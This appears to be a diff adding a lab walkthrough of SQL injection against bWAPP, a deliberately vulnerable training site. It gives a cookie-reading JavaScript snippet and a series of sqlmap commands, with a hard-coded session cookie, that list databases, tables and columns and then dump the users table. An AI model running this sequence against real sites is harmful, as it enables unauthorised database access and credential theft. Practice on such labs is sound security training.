@@ -1,0 +1,16 @@
+SQL Injection on BWAPP site with steps and code:
+
+Determining the cookie value used by the application by using following command:
+javascript:alert(document.cookie)
+
+Determining all databases names using below command:
+sqlmap -u "https://bwapp.hakhub.net/sqli_1.php?title=" --cookie="PHPSESSID=m3uut3veh7fshhq30n5h08ke74;security_level=0" --dbs
+
+Next, we have selected the bWAPP database and will try to find tables used in this database using the below command.
+sqlmap -u "https://bwapp.hakhub.net/sqli_1.php?title=" --cookie="PHPSESSID=m3uut3veh7fshhq30n5h08ke74;security_level=0" -D bWAPP --tables
+
+Next, we have selected users table and now will find the columns in users table using the below command: 
+sqlmap -u "https://bwapp.hakhub.net/sqli_1.php?title=" --cookie="PHPSESSID=m3uut3veh7fshhq30n5h08ke74;security_level=0" -D bWAPP -T users --columns
+
+Now after retrieving the columns, we will dump all data from this table and save it in a file. This is done using the below command:
+sqlmap -u "https://bwapp.hakhub.net/sqli_1.php?title=" --cookie="PHPSESSID=m3uut3veh7fshhq30n5h08ke74;security_level=0" -D bWAPP -T users --columns –dump
